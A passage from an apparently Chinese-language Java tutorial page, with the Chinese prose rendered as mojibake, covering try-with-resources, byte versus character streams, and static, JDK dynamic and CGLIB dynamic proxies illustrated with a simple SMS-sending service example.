class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè°ƒç”¨ f(2)ï¼Œè¿”å›å€¼å°†æ˜¯ 0ï¼Œå› ä¸º finally è¯­å¥çš„è¿”å›å€¼è¦†ç›–äº† try è¯­å¥å—çš„è¿”å›å€¼ã€‚</p>
<h4 id="ä½¿ç”¨try-with-resourcesæ¥ä»£æ›¿try-catch-finally"><a href="#ä½¿ç”¨try-with-resourcesæ¥ä»£æ›¿try-catch-finally" class="headerlink" title="ä½¿ç”¨try-with-resourcesæ¥ä»£æ›¿try-catch-finally"></a>ä½¿ç”¨try-with-resourcesæ¥ä»£æ›¿try-catch-finally</h4><ol>
<li>é€‚ç”¨èŒƒå›´ï¼ˆèµ„æºçš„å®šä¹‰ï¼‰ï¼š ä»»ä½•å®ç° java.lang.AutoCloseableæˆ–è€… java.io.Closeable çš„å¯¹è±¡</li>
<li>å…³é—­èµ„æºå’Œ final çš„æ‰§è¡Œé¡ºåºï¼š åœ¨ try-with-resources è¯­å¥ä¸­ï¼Œä»»ä½• catch æˆ– finally å—åœ¨å£°æ˜çš„èµ„æºå…³é—­åè¿è¡Œ</li>
</ol>
<p>ã€ŠEffecitve Javaã€‹ä¸­æ˜ç¡®æŒ‡å‡ºï¼š</p>
<blockquote>
<p>é¢å¯¹å¿…é¡»è¦å…³é—­çš„èµ„æºï¼Œæˆ‘ä»¬æ€»æ˜¯åº”è¯¥ä¼˜å…ˆä½¿ç”¨ try-with-resources è€Œä¸æ˜¯try-finallyã€‚éšä¹‹äº§ç”Ÿçš„ä»£ç æ›´ç®€çŸ­ï¼Œæ›´æ¸…æ™°ï¼Œäº§ç”Ÿçš„å¼‚å¸¸å¯¹æˆ‘ä»¬ä¹Ÿæ›´æœ‰ç”¨ã€‚try-with-resourcesè¯­å¥è®©æˆ‘ä»¬æ›´å®¹æ˜“ç¼–å†™å¿…é¡»è¦å…³é—­çš„èµ„æºçš„ä»£ç ï¼Œè‹¥é‡‡ç”¨try-finallyåˆ™å‡ ä¹åšä¸åˆ°è¿™ç‚¹ã€‚</p>
</blockquote>
<p>å½“ç„¶å¤šä¸ªèµ„æºéœ€è¦å…³é—­çš„æ—¶å€™ï¼Œä½¿ç”¨ try-with-resources å®ç°èµ·æ¥ä¹Ÿéå¸¸ç®€å•, é€šè¿‡ä½¿ç”¨åˆ†å·åˆ†éš”ï¼Œå¯ä»¥åœ¨try-with-resourceså—ä¸­å£°æ˜å¤šä¸ªèµ„æºã€‚</p>
<h4 id="æ—¢ç„¶æœ‰äº†å­—èŠ‚æµ-ä¸ºä»€ä¹ˆè¿˜è¦æœ‰å­—ç¬¦æµ"><a href="#æ—¢ç„¶æœ‰äº†å­—èŠ‚æµ-ä¸ºä»€ä¹ˆè¿˜è¦æœ‰å­—ç¬¦æµ" class="headerlink" title="æ—¢ç„¶æœ‰äº†å­—èŠ‚æµ,ä¸ºä»€ä¹ˆè¿˜è¦æœ‰å­—ç¬¦æµ?"></a>æ—¢ç„¶æœ‰äº†å­—èŠ‚æµ,ä¸ºä»€ä¹ˆè¿˜è¦æœ‰å­—ç¬¦æµ?</h4><p>é—®é¢˜æœ¬è´¨æƒ³é—®ï¼š<strong>ä¸ç®¡æ˜¯æ–‡ä»¶è¯»å†™è¿˜æ˜¯ç½‘ç»œå‘é€æ¥æ”¶ï¼Œä¿¡æ¯çš„æœ€å°å­˜å‚¨å•å…ƒéƒ½æ˜¯å­—èŠ‚ï¼Œé‚£ä¸ºä»€ä¹ˆ I&#x2F;O æµæ“ä½œè¦åˆ†ä¸ºå­—èŠ‚æµæ“ä½œå’Œå­—ç¬¦æµæ“ä½œå‘¢ï¼Ÿ</strong></p>
<p>å›ç­”ï¼šJavaä¸­ä¸€åˆ‡éƒ½æ˜¯å­—èŠ‚æµï¼Œæ²¡æœ‰å­—ç¬¦æµï¼Œå­—ç¬¦åªæ˜¯æ ¹æ®ç¼–ç å¯¹å­—èŠ‚æµè¿›è¡Œç¿»è¯‘çš„ç»“æœã€‚å­—ç¬¦æµæ˜¯ç”± Java è™šæ‹Ÿæœºå°†å­—èŠ‚è½¬æ¢å¾—åˆ°çš„ï¼Œé—®é¢˜å°±å‡ºåœ¨è¿™ä¸ªè¿‡ç¨‹è¿˜ç®—æ˜¯éå¸¸è€—æ—¶ï¼Œå¹¶ä¸”ï¼Œå¦‚æœæˆ‘ä»¬ä¸çŸ¥é“ç¼–ç ç±»å‹å°±å¾ˆå®¹æ˜“å‡ºç°ä¹±ç é—®é¢˜ã€‚æ‰€ä»¥ï¼Œ I&#x2F;O æµå°±å¹²è„†æä¾›äº†ä¸€ä¸ªç›´æ¥æ“ä½œå­—ç¬¦çš„æ¥å£ï¼Œæ–¹ä¾¿æˆ‘ä»¬å¹³æ—¶å¯¹å­—ç¬¦è¿›è¡Œæµæ“ä½œã€‚å¦‚æœéŸ³é¢‘æ–‡ä»¶ã€å›¾ç‰‡ç­‰åª’ä½“æ–‡ä»¶ç”¨å­—èŠ‚æµæ¯”è¾ƒå¥½ï¼Œå¦‚æœæ¶‰åŠåˆ°å­—ç¬¦çš„è¯ä½¿ç”¨å­—ç¬¦æµæ¯”è¾ƒå¥½ã€‚</p>
<h2 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h2><p>é™æ€ä»£ç†ä¸­ï¼Œæˆ‘ä»¬å¯¹ç›®æ ‡å¯¹è±¡çš„æ¯ä¸ªæ–¹æ³•çš„å¢å¼ºéƒ½æ˜¯æ‰‹åŠ¨å®Œæˆçš„ï¼ˆåé¢ä¼šå…·ä½“æ¼”ç¤ºä»£ç ï¼‰ï¼Œéå¸¸ä¸çµæ´»ï¼ˆæ¯”å¦‚æ¥å£ä¸€æ—¦æ–°å¢åŠ æ–¹æ³•ï¼Œç›®æ ‡å¯¹è±¡å’Œä»£ç†å¯¹è±¡éƒ½è¦è¿›è¡Œä¿®æ”¹ï¼‰ä¸”éº»çƒ¦(éœ€è¦å¯¹æ¯ä¸ªç›®æ ‡ç±»éƒ½å•ç‹¬å†™ä¸€ä¸ªä»£ç†ç±»)ã€‚ å®é™…åº”ç”¨åœºæ™¯éå¸¸éå¸¸å°‘ï¼Œæ—¥å¸¸å¼€å‘å‡ ä¹çœ‹ä¸åˆ°ä½¿ç”¨é™æ€ä»£ç†çš„åœºæ™¯ã€‚</p>
<p>ä¸Šé¢æˆ‘ä»¬æ˜¯ä»å®ç°å’Œåº”ç”¨è§’åº¦æ¥è¯´çš„é™æ€ä»£ç†ï¼Œä» JVM å±‚é¢æ¥è¯´ï¼Œ é™æ€ä»£ç†åœ¨ç¼–è¯‘æ—¶å°±å°†æ¥å£ã€å®ç°ç±»ã€ä»£ç†ç±»è¿™äº›éƒ½å˜æˆäº†ä¸€ä¸ªä¸ªå®é™…çš„ class æ–‡ä»¶ã€‚</p>
<p>é™æ€ä»£ç†å®ç°æ­¥éª¤:</p>
<ol>
<li>å®šä¹‰ä¸€ä¸ªæ¥å£åŠå…¶å®ç°ç±»ï¼›</li>
<li>åˆ›å»ºä¸€ä¸ªä»£ç†ç±»åŒæ ·å®ç°è¿™ä¸ªæ¥å£</li>
<li>å°†ç›®æ ‡å¯¹è±¡æ³¨å…¥è¿›ä»£ç†ç±»ï¼Œç„¶ååœ¨ä»£ç†ç±»çš„å¯¹åº”æ–¹æ³•è°ƒç”¨ç›®æ ‡ç±»ä¸­çš„å¯¹åº”æ–¹æ³•ã€‚è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä»£ç†ç±»å±è”½å¯¹ç›®æ ‡å¯¹è±¡çš„è®¿é—®ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ç›®æ ‡æ–¹æ³•æ‰§è¡Œå‰ååšä¸€äº›è‡ªå·±æƒ³åšçš„äº‹æƒ…ã€‚</li>
</ol>
<p>ä¸‹é¢é€šè¿‡ä»£ç å±•ç¤ºï¼</p>
<p><strong>1.å®šä¹‰å‘é€çŸ­ä¿¡çš„æ¥å£</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    String <span class="title function_">send</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.å®ç°å‘é€çŸ­ä¿¡çš„æ¥å£</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.åˆ›å»ºä»£ç†ç±»å¹¶åŒæ ·å®ç°å‘é€çŸ­ä¿¡çš„æ¥å£</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsProxy</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SmsService smsService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SmsProxy</span><span class="params">(SmsService smsService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.smsService = smsService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="comment">//è°ƒç”¨æ–¹æ³•ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ è‡ªå·±çš„æ“ä½œ</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method send()&quot;</span>);</span><br><span class="line">        smsService.send(message);</span><br><span class="line">        <span class="comment">//è°ƒç”¨æ–¹æ³•ä¹‹åï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥æ·»åŠ è‡ªå·±çš„æ“ä½œ</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method send()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>4.å®é™…ä½¿ç”¨</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>();</span><br><span class="line">        <span class="type">SmsProxy</span> <span class="variable">smsProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsProxy</span>(smsService);</span><br><span class="line">        smsProxy.send(<span class="string">&quot;java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œä¸Šè¿°ä»£ç ä¹‹åï¼Œæ§åˆ¶å°æ‰“å°å‡ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">before method send()</span><br><span class="line">send message:java</span><br><span class="line">after method send()</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è¾“å‡ºç»“æœçœ‹å‡ºï¼Œæˆ‘ä»¬å·²ç»å¢åŠ äº† <code>SmsServiceImpl</code> çš„<code>send()</code>æ–¹æ³•ã€‚</p>
<h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><p>ç›¸æ¯”äºé™æ€ä»£ç†æ¥è¯´ï¼ŒåŠ¨æ€ä»£ç†æ›´åŠ çµæ´»ã€‚æˆ‘ä»¬ä¸éœ€è¦é’ˆå¯¹æ¯ä¸ªç›®æ ‡ç±»éƒ½å•ç‹¬åˆ›å»ºä¸€ä¸ªä»£ç†ç±»ï¼Œå¹¶ä¸”ä¹Ÿä¸éœ€è¦æˆ‘ä»¬å¿…é¡»å®ç°æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»£ç†å®ç°ç±»( <em>CGLIB åŠ¨æ€ä»£ç†æœºåˆ¶</em>)ã€‚</p>
<p><strong>ä» JVM è§’åº¦æ¥è¯´ï¼ŒåŠ¨æ€ä»£ç†æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆç±»å­—èŠ‚ç ï¼Œå¹¶åŠ è½½åˆ° JVM ä¸­çš„ã€‚</strong></p>
<p>Spring AOPã€RPC æ¡†æ¶å®ç°éƒ½ä¾èµ–äº†åŠ¨æ€ä»£ç†ã€‚</p>
<p><strong>åŠ¨æ€ä»£ç†åœ¨æˆ‘ä»¬æ—¥å¸¸å¼€å‘ä¸­ä½¿ç”¨çš„ç›¸å¯¹è¾ƒå°ï¼Œä½†æ˜¯åœ¨æ¡†æ¶ä¸­çš„å‡ ä¹æ˜¯å¿…ç”¨çš„ä¸€é—¨æŠ€æœ¯ã€‚å­¦ä¼šäº†åŠ¨æ€ä»£ç†ä¹‹åï¼Œå¯¹äºæˆ‘ä»¬ç†è§£å’Œå­¦ä¹ å„ç§æ¡†æ¶çš„åŸç†ä¹Ÿéå¸¸æœ‰å¸®åŠ©ã€‚</strong></p>
<p>å°± Java æ¥è¯´ï¼ŒåŠ¨æ€ä»£ç†çš„å®ç°æ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œæ¯”å¦‚ <strong>JDK åŠ¨æ€ä»£ç†</strong>ã€<strong>CGLIB åŠ¨æ€ä»£ç†</strong>ç­‰ç­‰ã€‚t</p>
<h3 id="jdkåŠ¨æ€ä»£ç†æœºåˆ¶"><a href="#jdkåŠ¨æ€ä»£ç†æœºåˆ¶" class="headerlink" title="jdkåŠ¨æ€ä»£ç†æœºåˆ¶"></a>jdkåŠ¨æ€ä»£ç†æœºåˆ¶</h3><ol>
<li>å®šä¹‰ä¸€ä¸ªæ¥å£åŠå…¶å®ç°ç±»ï¼›</li>
<li>è‡ªå®šä¹‰ InvocationHandler å¹¶é‡å†™invokeæ–¹æ³•ï¼Œåœ¨ invoke æ–¹æ³•ä¸­æˆ‘ä»¬ä¼šè°ƒç”¨åŸç”Ÿæ–¹æ³•ï¼ˆè¢«ä»£ç†ç±»çš„æ–¹æ³•ï¼‰å¹¶è‡ªå®šä¹‰ä¸€äº›å¤„ç†é€»è¾‘ï¼›</li>
<li>é€šè¿‡ Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) æ–¹æ³•åˆ›å»ºä»£ç†å¯¹è±¡ï¼›</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰å‘é€çŸ­ä¿¡çš„æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    String <span class="title function_">send</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å®ç°å‘é€çŸ­ä¿¡çš„æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªJDKåŠ¨æ€ä»£ç†ç±»</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DebugInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä»£ç†ç±»ä¸­çš„çœŸå®å¯¹è±¡</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DebugInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//invoke() æ–¹æ³•: å½“æˆ‘ä»¬çš„åŠ¨æ€ä»£ç†å¯¹è±¡è°ƒç”¨åŸç”Ÿæ–¹æ³•çš„æ—¶å€™ï¼Œæœ€ç»ˆå®é™…ä¸Šè°ƒç”¨åˆ°çš„æ˜¯ invoke() æ–¹æ³•ï¼Œç„¶å invoke() æ–¹æ³•ä»£æ›¿æˆ‘ä»¬å»è°ƒç”¨äº†è¢«ä»£ç†å¯¹è±¡çš„åŸç”Ÿæ–¹æ³•ã€‚</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//è°ƒç”¨æ–¹æ³•ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ è‡ªå·±çš„æ“ä½œ</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        <span class="comment">//è°ƒç”¨æ–¹æ³•ä¹‹åï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥æ·»åŠ è‡ªå·±çš„æ“ä½œ</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–ä»£ç†å¯¹è±¡çš„å·¥å‚ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdkProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(), <span class="comment">// ç›®æ ‡ç±»çš„ç±»åŠ è½½</span></span><br><span class="line">                target.getClass().getInterfaces(),  <span class="comment">// ä»£ç†éœ€è¦å®ç°çš„æ¥å£ï¼Œå¯æŒ‡å®šå¤šä¸ª</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">DebugInvocationHandler</span>(target)   <span class="comment">// ä»£ç†å¯¹è±¡å¯¹åº”çš„è‡ªå®šä¹‰ InvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®é™…ä½¿ç”¨</span></span><br><span class="line"><span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> (SmsService) JdkProxyFactory.getProxy(<span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>());</span><br><span class="line">smsService.send(<span class="string">&quot;java&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CGLIBåŠ¨æ€ä»£ç†æœºåˆ¶"><a href="#CGLIBåŠ¨æ€ä»£ç†æœºåˆ¶" class="headerlink" title="CGLIBåŠ¨æ€ä»£ç†æœºåˆ¶"></a>CGLIBåŠ¨æ€ä»£ç†æœºåˆ¶</h3><p>JDKåŠ¨æ€ä»£ç†æœ‰ä¸€ä¸ªæœ€è‡´å‘½çš„é—®é¢˜æ˜¯å…¶åªèƒ½ä»£ç†å®ç°äº†æ¥å£çš„ç±».å¯ä»¥ä½¿ç”¨CGLIBåŠ¨æ€ä»£ç†æœºåˆ¶æ¥é¿å….</p>
<p>CGLIB(Code Generation Library)æ˜¯ä¸€ä¸ªåŸºäºASMçš„å­—èŠ‚ç ç”Ÿæˆåº“ï¼Œå®ƒå…è®¸æˆ‘ä»¬åœ¨è¿è¡Œæ—¶å¯¹å­—èŠ‚ç è¿›è¡Œä¿®æ”¹å’ŒåŠ¨æ€ç”Ÿæˆã€‚CGLIB é€šè¿‡ç»§æ‰¿æ–¹å¼å®ç°ä»£ç†ã€‚å¾ˆå¤šçŸ¥åçš„å¼€æºæ¡†æ¶éƒ½ä½¿ç”¨åˆ°äº†CGLIBï¼Œ ä¾‹å¦‚ Spring ä¸­çš„ AOP æ¨¡å—ä¸­ï¼šå¦‚æœç›®æ ‡å¯¹è±¡å®ç°äº†æ¥å£ï¼Œåˆ™é»˜è®¤é‡‡ç”¨ JDK åŠ¨æ€ä»£ç†ï¼Œå¦åˆ™é‡‡ç”¨ CGLIB åŠ¨æ€ä»£ç†ã€‚</p>
<p>åœ¨ CGLIB åŠ¨æ€ä»£ç†æœºåˆ¶ä¸­ MethodInterceptor æ¥å£å’Œ Enhancer ç±»æ˜¯æ ¸å¿ƒã€‚</p>
<p>ä½ éœ€è¦è‡ªå®šä¹‰ MethodInterceptor å¹¶é‡å†™ intercept æ–¹æ³•ï¼Œintercept ç”¨äºæ‹¦æˆªå¢å¼ºè¢«ä»£ç†ç±»çš„æ–¹æ³•ã€‚</p>
<ol>
<li>å®šä¹‰ä¸€ä¸ªç±»ï¼›</li>
<li>è‡ªå®šä¹‰ MethodInterceptor å¹¶é‡å†™ intercept æ–¹æ³•ï¼Œintercept ç”¨äºæ‹¦æˆªå¢å¼ºè¢«ä»£ç†ç±»çš„æ–¹æ³•ï¼Œå’Œ JDK åŠ¨æ€ä»£ç†ä¸­çš„ invoke æ–¹æ³•ç±»ä¼¼ï¼›</li>
<li>é€šè¿‡ Enhancer ç±»çš„ create()åˆ›å»ºä»£ç†ç±»ï¼›</li>
</ol>
<p>ä¸åŒäº JDK åŠ¨æ€ä»£ç†ä¸éœ€è¦é¢å¤–çš„ä¾èµ–ã€‚CGLIB(Code Generation Library) å®é™…æ˜¯å±äºä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œå¦‚æœä½ è¦ä½¿ç”¨å®ƒçš„è¯ï¼Œéœ€è¦æ‰‹åŠ¨æ·»åŠ ç›¸å…³ä¾èµ–ã€‚</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>1.å®ç°ä¸€ä¸ªä½¿ç”¨é˜¿é‡Œäº‘å‘é€çŸ­ä¿¡çš„ç±»</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> github.javaguide.dynamicProxy.cglibDynamicProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AliSmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.è‡ªå®šä¹‰ MethodInterceptorï¼ˆæ–¹æ³•æ‹¦æˆªå™¨ï¼‰</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodInterceptor;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodProxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è‡ªå®šä¹‰MethodInterceptor</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DebugMethodInterceptor</span> <span class="keyword">implements</span> <span class="title class_">MethodInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> o           è¢«ä»£ç†çš„å¯¹è±¡ï¼ˆéœ€è¦å¢å¼ºçš„å¯¹è±¡ï¼‰</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method      è¢«æ‹¦æˆªçš„æ–¹æ³•ï¼ˆéœ€è¦å¢å¼ºçš„æ–¹æ³•ï¼‰</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args        æ–¹æ³•å…¥å‚</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodProxy ç”¨äºè°ƒç”¨åŸå§‹æ–¹æ³•</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object o, Method method, Object[] args, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//è°ƒç”¨æ–¹æ³•ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ è‡ªå·±çš„æ“ä½œ</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> methodProxy.invokeSuper(o, args);</span><br><span class="line">        <span class="comment">//è°ƒç”¨æ–¹æ³•ä¹‹åï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥æ·»åŠ è‡ªå·±çš„æ“ä½œ</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.è·å–ä»£ç†ç±»</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.Enhancer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CglibProxyFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºåŠ¨æ€ä»£ç†å¢å¼ºç±»</span></span><br><span class="line">        <span class="type">Enhancer</span> <span class="variable">enhancer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Enhancer</span>();</span><br><span class="line">        <span class="comment">// è®¾ç½®ç±»åŠ è½½å™¨</span></span><br><span class="line">        enhancer.setClassLoader(clazz.getClassLoader());</span><br><span class="line">        <span class="comment">// è®¾ç½®è¢«ä»£ç†ç±»</span></span><br><span class="line">        enhancer.setSuperclass(clazz);</span><br><span class="line">        <span class="comment">// è®¾ç½®æ–¹æ³•æ‹¦æˆªå™¨</span></span><br><span class="line">        enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">DebugMethodInterceptor</span>());</span><br><span class="line">        <span class="comment">// åˆ›å»ºä»£ç†ç±»</span></span><br><span class="line">        <span class="keyword">return</span> enhancer.create();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;Copy to clipboardErrorCopied</span><br></pre></td></tr></table></figure>

<p><strong>4.å®é™…ä½¿ç”¨</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AliSmsService</span> <span class="variable">aliSmsService</span> <span class="operator">=</span> (AliSmsService) CglibProxyFactory.getProxy(AliSmsService.class);</span><br><span class="line">aliSmsService.send(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure>

